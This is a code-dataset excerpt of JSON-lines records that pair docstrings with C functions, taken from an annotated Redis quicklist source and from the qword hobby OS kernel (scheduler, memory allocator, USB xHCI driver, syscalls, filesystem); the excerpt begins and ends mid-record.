center);\n        center = NULL; /* center could have been deleted, invalidate it. */\n    } else {\n        /* else, we didn't merge here, but target needs to be valid below. */\n        target = center;    //\u9632\u6b62\u91ce\u6307\u9488\n    }\n\n    /* Use result of center merge (or original) to merge with next node. */\n    //\u5982\u679c\u5141\u8bb8\u5408\u5e76\uff0c\u5408\u5e76target\u548cnext\u8282\u70b9\n    if (_quicklistNodeAllowMerge(target, target->next, fill)) {\n        _quicklistZiplistMerge(quicklist, target, target->next);\n    }\n}", "path": "quicklist.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/* Wrapper to allow argument-based switching between HEAD/TAIL pop */\n//\u5c06push\u51fd\u6570\u5c01\u88c5\u8d77\u6765\uff0c\u901a\u8fc7where \u8868\u793apush\u5934\u90e8\u6216push\u5c3e\u90e8\n", "func_signal": "void quicklistPush(quicklist *quicklist, void *value, const size_t sz,\n                   int where)", "code": "{\n    if (where == QUICKLIST_HEAD) {                  //\u5934\u63d2\n        quicklistPushHead(quicklist, value, sz);\n    } else if (where == QUICKLIST_TAIL) {           //\u5c3e\u63d2\n        quicklistPushTail(quicklist, value, sz);\n    }\n}", "path": "quicklist.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/* Append all values of ziplist 'zl' individually into 'quicklist'.\n *\n * This allows us to restore old RDB ziplists into new quicklists\n * with smaller ziplist sizes than the saved RDB ziplist.\n *\n * Returns 'quicklist' argument. Frees passed-in ziplist 'zl' */\n//\u5728quicklist\u672b\u5c3e\u8ffd\u52a0\u4e00\u4e2aentry\n", "func_signal": "quicklist *quicklistAppendValuesFromZiplist(quicklist *quicklist,\n                                            unsigned char *zl)", "code": "{\n    unsigned char *value;\n    unsigned int sz;\n    long long longval;\n    char longstr[32] = {0};\n\n    unsigned char *p = ziplistIndex(zl, 0); //\u83b7\u5f97ziplist\u7b2c\u4e00\u4e2a\u8282\u70b9\u7684\u5730\u5740\n    while (ziplistGet(p, &value, &sz, &longval)) {  //\u5c06p\u6307\u5411\u7684entry\u8282\u70b9\u4fe1\u606f\uff0c\u4fdd\u5b58\u5230value\u6216sz\u6216longval\u4e2d\n        if (!value) {   //\u5982\u679c\u5b57\u7b26\u4e32\u4e3a\u7a7a\n            /* Write the longval as a string so we can re-add it */\n            sz = ll2string(longstr, sizeof(longstr), longval);  //\u5c06longlong\u7c7b\u578b\u7684\u6574\u6570\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\n            value = (unsigned char *)longstr;                   //\u4fdd\u5b58\u5230value\u4e2d\n        }\n        quicklistPushTail(quicklist, value, sz);                //\u8ffd\u52a0\u5230quicklist\u7684\u5c3e\u90e8\n        p = ziplistNext(zl, p); //\u66f4\u65b0p\u6307\u5411\u4e0b\u4e00\u4e2aentry\u8282\u70b9\n    }\n    zfree(zl);              //\u91ca\u653e\u7a7a\u95f4\n    return quicklist;\n}", "path": "quicklist.c", "repo_name": "menwenjun/redis_source_annotation", "stars": 509, "license": "None", "language": "c", "size": 2333}
{"docstring": "/* Create process */\n/* Returns process ID, -1 on failure */\n", "func_signal": "pid_t task_pcreate(void)", "code": "{\n    spinlock_acquire(&scheduler_lock);\n\n    /* Search for free process ID */\n    pid_t new_pid;\n    for (new_pid = 0; new_pid < MAX_PROCESSES - 1; new_pid++) {\n        if (!process_table[new_pid] || process_table[new_pid] == (void *)(-1))\n            goto found_new_pid;\n    }\n    spinlock_release(&scheduler_lock);\n    return -1;\n\nfound_new_pid:\n    process_table[new_pid] = (void *)(-2); // placeholder\n    spinlock_release(&scheduler_lock);\n\n    /* Try to make space for this new task */\n    struct process_t *new_process = kalloc(sizeof(struct process_t));\n    if (!new_process) {\n        spinlock_acquire(&scheduler_lock);\n        process_table[new_pid] = EMPTY;\n        spinlock_release(&scheduler_lock);\n        return -1;\n    }\n\n    if ((new_process->threads = kalloc(MAX_THREADS * sizeof(struct thread_t *))) == 0) {\n        kfree(new_process);\n        spinlock_acquire(&scheduler_lock);\n        process_table[new_pid] = EMPTY;\n        spinlock_release(&scheduler_lock);\n        return -1;\n    }\n\n    if ((new_process->file_handles = kalloc(MAX_FILE_HANDLES * sizeof(int))) == 0) {\n        kfree(new_process->threads);\n        kfree(new_process);\n        spinlock_acquire(&scheduler_lock);\n        process_table[new_pid] = EMPTY;\n        spinlock_release(&scheduler_lock);\n        return -1;\n    }\n\n    /* Initially, mark all file handles as unused */\n    for (size_t i = 0; i < MAX_FILE_HANDLES; i++) {\n        new_process->file_handles[i] = -1;\n    }\n\n    /* Make all signal handlers SIG_DFL */\n    for (size_t i = 0; i < SIGNAL_MAX; i++)\n        new_process->signal_handlers[i].sa_handler = SIG_DFL;\n\n    new_process->file_handles_lock = new_lock;\n\n    strcpy(new_process->cwd, \"/\");\n    new_process->cwd_lock = new_lock;\n\n    new_process->cur_brk = BASE_BRK_LOCATION;\n    new_process->cur_brk_lock = new_lock;\n\n    new_process->child_event_lock = new_lock;\n\n    memset(&new_process->own_usage, 0, sizeof(struct rusage_t));\n    memset(&new_process->child_usage, 0, sizeof(struct rusage_t));\n    new_process->usage_lock = new_lock;\n\n    /* Create a new pagemap for the process */\n    new_process->pagemap = new_address_space();\n    if (!new_process->pagemap) {\n        kfree(new_process->file_handles);\n        kfree(new_process->threads);\n        kfree(new_process);\n        spinlock_acquire(&scheduler_lock);\n        process_table[new_pid] = EMPTY;\n        spinlock_release(&scheduler_lock);\n        return -1;\n    }\n\n    new_process->pid = new_pid;\n\n    // Actually \"enable\" the new process\n    spinlock_acquire(&scheduler_lock);\n    process_table[new_pid] = new_process;\n    spinlock_release(&scheduler_lock);\n    return new_pid;\n}", "path": "src\\proc\\task.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/** /dev/urandom **/\n", "func_signal": "static int urandom_write(int unused1, const void *unused2, uint64_t unused3, size_t count)", "code": "{\n    (void)unused1;\n    (void)unused2;\n    (void)unused3;\n\n    return (int)count;\n}", "path": "src\\devices\\streams\\streams.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/*\n * Context management\n */\n", "func_signal": "void xhci_setup_context(struct xhci_ctx *ctx, uint32_t size, uint32_t type)", "code": "{\n    void *addr = kalloc(size);\n    ctx->addr = (uint8_t *)addr;\n    ctx->dma_addr = (size_t)ctx->addr - MEM_PHYS_OFFSET;\n    ctx->type = type;\n    ctx->size = size;\n}", "path": "src\\usb\\hcd\\xhci.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/* Allocate physical memory with O(1)-like optimisation */\n", "func_signal": "static void *pmm_alloc_fast(size_t pg_count)", "code": "{\n    spinlock_acquire(&pmm_lock);\n\n    size_t pg_cnt = pg_count;\n\n    for (size_t i = 0; i < bitmap_entries; i++) {\n        if (cur_ptr == BITMAP_BASE + bitmap_entries) {\n            cur_ptr = BITMAP_BASE;\n            pg_cnt = pg_count;\n        }\n        if (!read_bitmap(cur_ptr++)) {\n            if (!--pg_cnt)\n                goto found;\n        } else {\n            pg_cnt = pg_count;\n        }\n    }\n\n    spinlock_release(&pmm_lock);\n\n    panic(NULL, 1, \"Kernel ran out of memory.\");\n\nfound:;\n    size_t start = cur_ptr - pg_count;\n    set_bitmap(start, pg_count);\n\n    spinlock_release(&pmm_lock);\n\n    // Return the physical address that represents the start of this physical page(s).\n    return (void *)(start * PAGE_SIZE);\n}", "path": "src\\mm\\pmm.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/** /dev/zero **/\n", "func_signal": "static int zero_write(int unused1, const void *unused2, uint64_t unused3, size_t count)", "code": "{\n    (void)unused1;\n    (void)unused2;\n    (void)unused3;\n\n    return (int)count;\n}", "path": "src\\devices\\streams\\streams.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/* Allocate physical memory without optimisation for early boot */\n", "func_signal": "static void *pmm_alloc_slow(size_t pg_count)", "code": "{\n    spinlock_acquire(&pmm_lock);\n\n    size_t pg_cnt = pg_count;\n\n    size_t i;\n    for (i = BITMAP_BASE; i < BITMAP_BASE + bitmap_entries; ) {\n        if (!read_bitmap(i++)) {\n            if (!--pg_cnt)\n                goto found;\n        } else {\n            pg_cnt = pg_count;\n        }\n    }\n\n    spinlock_release(&pmm_lock);\n\n    panic(NULL, 1, \"Kernel ran out of memory.\");\n\nfound:;\n    size_t start = i - pg_count;\n    set_bitmap(start, pg_count);\n\n    spinlock_release(&pmm_lock);\n\n    // Return the physical address that represents the start of this physical page(s).\n    return (void *)(start * PAGE_SIZE);\n}", "path": "src\\mm\\pmm.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/* Allocate physical memory and zero it out. */\n", "func_signal": "void *pmm_allocz(size_t pg_count)", "code": "{\n    void *ptr = pmm_alloc(pg_count);\n    if (!ptr)\n        return NULL;\n\n    uint64_t *pages = (uint64_t *)(ptr + MEM_PHYS_OFFSET);\n\n    for (size_t i = 0; i < (pg_count * PAGE_SIZE) / sizeof(uint64_t); i++)\n        pages[i] = 0;\n\n    return ptr;\n}", "path": "src\\mm\\pmm.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/*\n * Switch ports from the ehci controller to the xhci controller\n * this is needed on some intel xhci controllers.\n *\n * TODO: apparently on some specific devices this may not work\n * and the ports can't be switched to the xhci controller.\n */\n", "func_signal": "void xhci_switch_ports(struct pci_device_t *pci_dev)", "code": "{\n    uint32_t usb3_enable = pci_read_device_dword(pci_dev, 0xDC);\n    kprint(KPRN_INFO, \"usb/xhci: ports that can be switched to xhci: %X\",\n           usb3_enable);\n    pci_write_device_dword(pci_dev, 0xD8, usb3_enable);\n\n    uint32_t usb2_enable = pci_read_device_dword(pci_dev, 0xD4);\n    pci_write_device_dword(pci_dev, 0xD0, usb2_enable);\n\n    uint32_t switched = pci_read_device_dword(pci_dev, 0xD0);\n    kprint(KPRN_INFO, \"usb/xhci: ports that have been switched to xhci: %X\",\n           switched);\n}", "path": "src\\usb\\hcd\\xhci.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/* Conventional argument passing: rdi, rsi, rdx, r10, r8, r9 */\n", "func_signal": "int syscall_poll(struct regs_t *regs)", "code": "{\n    struct pollfd *fds     = (struct pollfd *)regs->rdi;\n    size_t         nfds    = (size_t)regs->rsi;\n    int            timeout = (int)regs->rdx;\n\n    spinlock_acquire(&scheduler_lock);\n    pid_t current_process = cpu_locals[current_cpu].current_process;\n    struct process_t *process = process_table[current_process];\n    spinlock_release(&scheduler_lock);\n\n    struct pollfd *system_fds = kalloc(sizeof(struct pollfd) * nfds);\n    for (size_t i = 0; i < nfds; i++) {\n        system_fds[i].events  = fds[i].events;\n        system_fds[i].revents = fds[i].revents;\n        system_fds[i].fd      = process->file_handles[fds[i].fd];\n    }\n\n    int ret = poll(fds, system_fds, timeout);\n\n    for (size_t i = 0; i < nfds; i++) {\n        fds[i].events  = system_fds[i].events;\n        fds[i].revents = system_fds[i].revents;\n    }\n\n    kfree(system_fds);\n\n    return ret;\n}", "path": "src\\proc\\syscalls.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/* Create thread from function pointer */\n/* Returns thread ID, -1 on failure */\n", "func_signal": "tid_t task_tcreate(pid_t pid, enum tcreate_abi abi, const void *opaque_data)", "code": "{\n    spinlock_acquire(&scheduler_lock);\n\n    /* Search for free thread ID in the process */\n    tid_t new_tid;\n    for (new_tid = 0; new_tid < MAX_THREADS; new_tid++) {\n        if (!process_table[pid]->threads[new_tid] || process_table[pid]->threads[new_tid] == (void *)(-1))\n            goto found_new_tid;\n    }\n    spinlock_release(&scheduler_lock);\n    return -1;\nfound_new_tid:;\n    process_table[pid]->threads[new_tid] = (void *)(-2); // placeholder\n\n    /* Search for free global task ID */\n    tid_t new_task_id;\n    for (new_task_id = 0; new_task_id < MAX_TASKS; new_task_id++) {\n        if (!task_table[new_task_id] || task_table[new_task_id] == (void *)(-1))\n            goto found_new_task_id;\n    }\n    process_table[pid]->threads[new_tid] = EMPTY;\n    spinlock_release(&scheduler_lock);\n    return -1;\nfound_new_task_id:;\n    task_table[new_task_id] = (void *)(-2); // placeholder\n\n    spinlock_release(&scheduler_lock);\n\n    /* Try to make space for this new thread */\n    struct thread_t *new_thread;\n    if (!(new_thread = kalloc(sizeof(struct thread_t)))) {\n        spinlock_acquire(&scheduler_lock);\n        process_table[pid]->threads[new_tid] = EMPTY;\n        task_table[new_task_id] = EMPTY;\n        spinlock_release(&scheduler_lock);\n        return -1;\n    }\n\n    /* Set up a kernel stack for the thread */\n    new_thread->kstack = (size_t)kalloc(STACK_SIZE) + STACK_SIZE;\n    if (new_thread->kstack == STACK_SIZE) {\n        kfree(new_thread);\n        spinlock_acquire(&scheduler_lock);\n        process_table[pid]->threads[new_tid] = EMPTY;\n        task_table[new_task_id] = EMPTY;\n        spinlock_release(&scheduler_lock);\n        return -1;\n    }\n    new_thread->kstack -= sizeof(uint64_t);\n    *((size_t *)new_thread->kstack) = 0;\n\n    new_thread->active_on_cpu = -1;\n\n    /* Set registers to defaults */\n    if (pid)\n        new_thread->ctx.regs = default_usr_regs;\n    else\n        new_thread->ctx.regs = default_krnl_regs;\n\n    new_thread->ctx.fxstate = kalloc(cpu_simd_region_size);\n\n    /* Set up a user stack for the thread */\n    if (pid) {\n        /* Virtual addresses of the stack. */\n        size_t stack_guardpage = STACK_LOCATION_TOP -\n                                 (STACK_SIZE + PAGE_SIZE/*guard page*/) * (new_tid + 1);\n        size_t stack_bottom = stack_guardpage + PAGE_SIZE;\n\n        /* Allocate physical memory for the stack and initialize it. */\n        char *stack_pm = pmm_allocz(STACK_SIZE / PAGE_SIZE);\n        if (!stack_pm) {\n            kfree((void *)(new_thread->kstack - STACK_SIZE));\n            kfree(new_thread);\n            spinlock_acquire(&scheduler_lock);\n            process_table[pid]->threads[new_tid] = EMPTY;\n            task_table[new_task_id] = EMPTY;\n            spinlock_release(&scheduler_lock);\n            return -1;\n        }\n\n        size_t *sbase = (size_t *)(stack_pm + STACK_SIZE + MEM_PHYS_OFFSET);\n        panic_unless(!((size_t)sbase & 0xF) && \"Stack base must be 16-byte aligned\");\n\n        size_t *sp;\n        if (abi == tcreate_elf_exec) {\n            const struct tcreate_elf_exec_data *data = opaque_data;\n\n            /* Push all strings onto the stack. */\n            char *strp = (char *)sbase;\n            size_t nenv = 0;\n            for (char **elem = data->envp; *elem; elem++) {\n                kprint(KPRN_INFO, \"Push envp %s\", *elem);\n                strp -= strlen(*elem) + 1;\n                strcpy(strp, *elem);\n                nenv++;\n            }\n            size_t nargs = 0;\n            for (char **elem = data->argv; *elem; elem++) {\n                kprint(KPRN_INFO, \"Push argv %s\", *elem);\n                strp -= strlen(*elem) + 1;\n                strcpy(strp, *elem);\n                nargs++;\n            }\n\n            /* Align strp to 16-byte so that the following calculation becomes easier. */\n            strp -= (size_t)strp & 0xF;\n\n            /* Make sure the *final* stack pointer is 16-byte aligned.\n                - The auxv takes a multiple of 16-bytes; ignore that.\n                - There are 2 markers that each take 8-byte; ignore that, too.\n                - Then, there is argc and (nargs + nenv)-many pointers to args/environ.\n                  Those are what we *really* care about. */\n            sp = (size_t *)strp;\n            if ((nargs + nenv + 1) & 1)\n                --sp;\n\n            *(--sp) = 0; *(--sp) = 0; /* Zero auxiliary vector entry */\n            sp -= 2; *sp = AT_ENTRY;    *(sp + 1) = data->auxval->at_entry;\n            sp -= 2; *sp = AT_PHDR;     *(sp + 1) = data->auxval->at_phdr;\n            sp -= 2; *sp = AT_PHENT;    *(sp + 1) = data->auxval->at_phent;\n            sp -= 2; *sp = AT_PHNUM;    *(sp + 1) = data->auxval->at_phnum;\n\n            size_t sa = (size_t)(stack_bottom + STACK_SIZE);\n            *(--sp) = 0; /* Marker for end of environ */\n            sp -= nenv;\n            for (size_t i = 0; i < nenv; i++) {\n                sa -= strlen(data->envp[i]) + 1;\n                sp[i] = sa;\n            }\n\n            *(--sp) = 0; /* Marker for end of argv */\n            sp -= nargs;\n            for (size_t i = 0; i < nargs; i++) {\n                sa -= strlen(data->argv[i]) + 1;\n                sp[i] = sa;\n            }\n            *(--sp) = nargs; /* argc */\n        }else{\n            /* Do not push anything onto the stack. */\n            sp = sbase;\n        }\n        panic_unless(!((size_t)sp & 0xF) && \"Stack must be 16-byte aligned on x86_64\");\n\n        /* Map the stack */\n        for (size_t i = 0; i < STACK_SIZE / PAGE_SIZE; i++) {\n            map_page(process_table[pid]->pagemap,\n                     (size_t)(stack_pm + (i * PAGE_SIZE)),\n                     (size_t)(stack_bottom + (i * PAGE_SIZE)),\n                     pid ? 0x07 : 0x03);\n        }\n        /* Add a guard page */\n        unmap_page(process_table[pid]->pagemap, stack_guardpage);\n        new_thread->ctx.regs.rsp = stack_bottom + STACK_SIZE - ((sbase - sp) * sizeof(size_t));\n    } else {\n        /* If it's a kernel thread, kstack is the main stack */\n        new_thread->ctx.regs.rsp = new_thread->kstack;\n    }\n\n    /* Set instruction pointer to entry point */\n    if (abi == tcreate_fn_call) {\n        const struct tcreate_fn_call_data *data = opaque_data;\n        new_thread->ctx.regs.rip = (size_t)data->fn;\n        new_thread->ctx.regs.rdi = (size_t)data->arg;\n        new_thread->fs_base = (size_t)data->fsbase;\n    } else {\n        panic_unless(abi == tcreate_elf_exec);\n        const struct tcreate_elf_exec_data *data = opaque_data;\n        new_thread->ctx.regs.rip = (size_t)data->entry;\n    }\n\n    memcpy(new_thread->ctx.fxstate, default_fxstate, cpu_simd_region_size);\n\n    new_thread->tid = new_tid;\n    new_thread->task_id = new_task_id;\n    new_thread->process = pid;\n    spinlock_release(&new_thread->lock);\n\n    /* Actually \"enable\" the new thread */\n    spinlock_acquire(&scheduler_lock);\n    process_table[pid]->threads[new_tid] = new_thread;\n    task_table[new_task_id] = new_thread;\n    task_count++;\n    spinlock_release(&scheduler_lock);\n    return new_tid;\n}", "path": "src\\proc\\task.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "// free on disk allocated space for this file and flush its cache\n", "func_signal": "static int erase_file(struct cached_file_t *cached_file, int update_entry)", "code": "{\n    struct mount_t *mnt = cached_file->mnt;\n    // erase block chain first\n    uint64_t empty = 0;\n    uint64_t block = cached_file->path_res.target.payload;\n    if (block != END_OF_CHAIN) {\n        for (;;) {\n            lseek(mnt->device, mnt->fatstart * mnt->bytesperblock\n                    + block * sizeof(uint64_t), SEEK_SET);\n            read(mnt->device, &block, sizeof(uint64_t));\n            lseek(mnt->device, -(sizeof(uint64_t)), SEEK_CUR);\n            write(mnt->device, &empty, sizeof(uint64_t));\n            if (block == END_OF_CHAIN)\n                break;\n        }\n    }\n    // clean up cache\n    struct cached_block_t *cached_blocks = cached_file->cached_blocks;\n    for (size_t i = 0; i < MAX_CACHED_BLOCKS; i++) {\n        if (cached_blocks[i].status) {\n            cached_blocks[i].status = CACHE_NOTREADY;\n            kfree(cached_blocks[i].cache);\n        }\n    }\n    // clean up metadata\n    cached_file->path_res.target.payload = END_OF_CHAIN;\n    cached_file->path_res.target.size = 0;\n    cached_file->total_blocks = 0;\n    kfree(cached_file->alloc_map);\n    cached_file->alloc_map = kalloc(sizeof(uint64_t));\n    if (update_entry)\n        wr_entry(mnt, cached_file->path_res.target_entry, &cached_file->path_res.target);\n\n    return 0;\n}", "path": "src\\fs\\echfs\\echfs.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/* Search for a new task to run */\n", "func_signal": "static inline tid_t task_get_next(tid_t current_task)", "code": "{\n    if (current_task != -1) {\n        current_task++;\n    } else {\n        current_task = 0;\n    }\n\n    for (int64_t i = 0; i < task_count; ) {\n        struct thread_t *thread = task_table[current_task];\n        if (!thread) {\n            /* End of task table, rewind */\n            current_task = 0;\n            thread = task_table[current_task];\n        }\n        if (thread == (void *)(-1) || thread == (void *)(-2)) {\n            /* This is an empty thread, skip */\n            goto skip;\n        }\n        if (thread->yield_target > uptime_raw) {\n            goto next;\n        }\n        if (!spinlock_test_and_acquire(&thread->lock)) {\n            /* If unable to acquire the thread's lock, skip */\n            goto next;\n        }\n        if (locked_read(int, &thread->paused)) {\n            spinlock_release(&thread->lock);\n            goto next;\n        }\n        if (thread->event_ptr) {\n            if(!thread->event_abrt) {\n                int wake = 0;\n                for(int i = 0; i < (thread->event_num); i++) {\n                    if(locked_read(event_t, thread->event_ptr[i])) {\n                        wake = 1;\n                        locked_dec(thread->event_ptr[i]);\n                        thread->out_event_ptr[i] = 1;\n                    }\n                }\n\n                //only trigger timeout if no other events happened\n                if(thread->event_timeout <= uptime_raw && (thread->event_timeout != 0) && !wake) {\n                    thread->event_ptr = 0;\n                    thread->event_timeout = 0;\n                    wake = 1;\n                }\n\n                if(wake) {\n                    thread->event_ptr = 0;\n                } else {\n                    spinlock_release(&thread->lock);\n                    goto next;\n                }\n            }\n        }\n        return current_task;\n        next:\n        i++;\n        skip:\n        if (++current_task == MAX_TASKS)\n            current_task = 0;\n    }\n\n    return -1;\n}", "path": "src\\proc\\task.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/** /dev/null **/\n", "func_signal": "static int null_write(int unused1, const void *unused2, uint64_t unused3, size_t count)", "code": "{\n    (void)unused1;\n    (void)unused2;\n    (void)unused3;\n\n    return (int)count;\n}", "path": "src\\devices\\streams\\streams.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/* Release physical memory. */\n", "func_signal": "void pmm_free(void *ptr, size_t pg_count)", "code": "{\n    spinlock_acquire(&pmm_lock);\n\n    size_t start = (size_t)ptr / PAGE_SIZE;\n\n    unset_bitmap(start, pg_count);\n\n    spinlock_release(&pmm_lock);\n}", "path": "src\\mm\\pmm.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/** initialise **/\n", "func_signal": "void init_dev_streams(void)", "code": "{\n    struct device_t device = {0};\n\n    device.calls = default_device_calls;\n\n    strcpy(device.name, \"null\");\n    device.calls.read = null_read;\n    device.calls.write = null_write;\n    device_add(&device);\n\n    strcpy(device.name, \"zero\");\n    device.calls.read = zero_read;\n    device.calls.write = zero_write;\n    device_add(&device);\n\n    strcpy(device.name, \"urandom\");\n    device.calls.read = urandom_read;\n    device.calls.write = urandom_write;\n    device_add(&device);\n}", "path": "src\\devices\\streams\\streams.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/*\n * Take the controller's ownership from the BIOS\n */\n", "func_signal": "void xhci_take_controller(struct xhci_hcd *controller)", "code": "{\n    uint32_t cparams;\n\n    cparams = controller->cap_regs->hccparams1;\n\n    size_t eoff = (((cparams & 0xFFFF0000) >> 16) * 4);\n    volatile uint32_t *extcap =\n        (uint32_t *)((size_t)controller->cap_regs + eoff);\n    if (!extcap) {\n        return;\n    }\n\n    // find the legacy capability\n    while (1) {\n        uint32_t val = *extcap;\n        if (val == 0xFFFFFFFF) {\n            break;\n        }\n        if (!(val & 0xFF)) {\n            break;\n        }\n\n        kprint(KPRN_INFO, \"usb/xhci found extcap: %X %X\", val & 0xFF, extcap);\n        if ((val & 0xff) == 1) {\n            // Bios semaphore\n            volatile uint8_t *bios_sem = (uint8_t *)((size_t)(extcap) + 0x2);\n            if (*bios_sem) {\n                kprint(KPRN_INFO, \"usb/xhci: device is bios-owned\");\n                volatile uint8_t *os_sem = (uint8_t *)((size_t)(extcap) + 0x3);\n                *os_sem = 1;\n                while (1) {\n                    bios_sem = (uint8_t *)((size_t)(extcap) + 0x2);\n                    if (*bios_sem == 0) {\n                        kprint(KPRN_INFO,\n                               \"usb/xhci: device is no longer bios-owned\");\n                        break;\n                    }\n                    ksleep(100);\n                }\n            }\n        }\n\n        uint32_t *old = (uint32_t *)extcap;\n        extcap = (uint32_t *)((size_t)extcap + (((val >> 8) & 0xFF) << 2));\n        if (old == extcap) {\n            break;\n        }\n    }\n}", "path": "src\\usb\\hcd\\xhci.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/* Kill a thread in a given process */\n/* Return -1 on failure */\n", "func_signal": "int task_tkill(pid_t pid, tid_t tid)", "code": "{\n    spinlock_acquire(&scheduler_lock);\n\n    if (!process_table[pid]->threads[tid]\n        || process_table[pid]->threads[tid] == (void *)(-1)\n        || process_table[pid]->threads[tid] == (void *)(-2)) {\n        spinlock_release(&scheduler_lock);\n        return -1;\n    }\n\n    struct thread_t *thread = process_table[pid]->threads[tid];\n    int active_on_cpu = thread->active_on_cpu;\n\n    locked_write(int, &thread->event_abrt, 1);\n\n    while (locked_read(int, &thread->in_syscall)) {\n        force_resched();\n        spinlock_acquire(&scheduler_lock);\n    }\n\n    if (active_on_cpu != -1 && active_on_cpu != current_cpu) {\n        /* Send abort execution IPI */\n        locked_write(int, &cpu_locals[active_on_cpu].ipi_abortexec_received, 0);\n        lapic_send_ipi(active_on_cpu, IPI_ABORTEXEC);\n        while (!locked_read(int, &cpu_locals[active_on_cpu].ipi_abortexec_received));\n    }\n\n    task_table[process_table[pid]->threads[tid]->task_id] = (void *)(-1);\n\n    void *kstack = (void *)(process_table[pid]->threads[tid]->kstack - STACK_SIZE);\n\n    kfree(process_table[pid]->threads[tid]);\n\n    process_table[pid]->threads[tid] = (void *)(-1);\n\n    task_count--;\n\n    if (active_on_cpu == current_cpu) {\n        asm volatile (\n            \"mov rsp, qword ptr gs:[8];\"\n            \"call kfree;\"\n            \"cli;\"\n            \"mov rdi, 0;\"\n            \"call abort_thread_exec;\"\n            :\n            : \"D\" (kstack)\n        );\n    } else {\n        kfree(kstack);\n    }\n\n    spinlock_release(&scheduler_lock);\n\n    return 0;\n}", "path": "src\\proc\\task.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "// cap reads and writes at 16M at a time\n", "func_signal": "int syscall_read(struct regs_t *regs)", "code": "{\n    // rdi: fd\n    // rsi: buf\n    // rdx: len\n    spinlock_acquire(&scheduler_lock);\n    pid_t current_process = cpu_locals[current_cpu].current_process;\n    struct process_t *process = process_table[current_process];\n    spinlock_release(&scheduler_lock);\n\n    if (privilege_check(regs->rsi, regs->rdx)) {\n        return -1;\n    }\n\n    spinlock_acquire(&process->file_handles_lock);\n    if (process->file_handles[regs->rdi] == -1) {\n        spinlock_release(&process->file_handles_lock);\n        errno = EBADF;\n        return -1;\n    }\n\n    size_t ptr = 0;\n    while (ptr < regs->rdx) {\n        size_t step;\n        if (ptr + SYSCALL_IO_CAP > regs->rdx)\n            step = regs->rdx % SYSCALL_IO_CAP;\n        else\n            step = SYSCALL_IO_CAP;\n        int ret = read(process->file_handles[regs->rdi], (void *)(regs->rsi + ptr), step);\n        ptr += ret;\n        if (ret < step)\n            break;\n    }\n\n    spinlock_release(&process->file_handles_lock);\n\n    return ptr;\n}", "path": "src\\proc\\syscalls.c", "repo_name": "qword-os/qword", "stars": 396, "license": "other", "language": "c", "size": 1396}
{"docstring": "/*\n * Parse the supported protocol extended capability\n */\n", "func_signal": "void xhci_get_port_speeds(struct xhci_hcd *controller)", "code": "{\n    uint32_t cparams;\n    cparams = controller->cap_regs->hccparams1;\n\n    size_t eoff = (((cparams & 0xFFFF0000) >> 16) * 4);\n    volatile uint32_t *extcap =\n        (uint32_t *)((size_t)controller->cap_regs + eoff);\n    if (!extcap) {\n        return;\n    }\n\n    while (1) {\n        uint32_t val = (uint32_t)*extcap;\n        if (val == 0xFFFFFFFF) {\n            break;\n        }\n        if (!(val & 0xFF)) {\n            break;\n        }\n\n        kprint(KPRN_INFO, \"usb/xhci found extcap: %X %X\", val & 0xFF, extcap);\n        if ((val & 0xff) == 2) {\n            uint32_t *old_ext = (uint32_t *)extcap;\n\n            struct xhci_port_protocol protocol = {0};\n            uint32_t value = *extcap;\n            protocol.major = (value >> 24) & 0xFF;\n            protocol.minor = (value >> 16) & 0xFF;\n            extcap++;\n            value = *extcap;\n            protocol.name[0] = (char)(value & 0xFF);\n            protocol.name[1] = (char)((value >> 8) & 0xFF);\n            protocol.name[2] = (char)((value >> 16) & 0xFF);\n            protocol.name[3] = (char)((value >> 24) & 0xFF);\n            protocol.name[4] = '\\0';\n            extcap++;\n            value = *extcap;\n            protocol.compatible_port_off = value & 0xFF;\n            protocol.compatible_port_count = (value >> 8) & 0xFF;\n            protocol.protocol_specific = (value >> 16) & 0xFF;\n            int speed_id_cnt = (value >> 28) & 0xF;\n            extcap++;\n            value = *extcap;\n            protocol.protocol_slot_type = value & 0xF;\n            extcap++;\n\n            for (int i = 0; i < speed_id_cnt; i++) {\n                value = *extcap;\n\n                protocol.speeds[i].value = value & 0xF;\n                protocol.speeds[i].exponent = (value >> 4) & 0x3;\n                protocol.speeds[i].type = (value >> 6) & 0x3;\n                protocol.speeds[i].full_duplex = (value >> 8) & 0x1;\n                protocol.speeds[i].link_protocol = (value >> 14) & 0x3;\n                protocol.speeds[i].mantissa = (value >> 16) & 0xFFFF;\n\n                extcap++;\n            }\n\n            kprint(KPRN_INFO, \"usb/xhci: port speed capability\");\n            kprint(KPRN_INFO,\n                   \"usb/xhci: protocol version: %u.%u, name: %s, offset: %X, \"\n                   \"count = %X\",\n                   protocol.major, protocol.minor, protocol.name,\n                   protocol.compatible_port_off,\n                   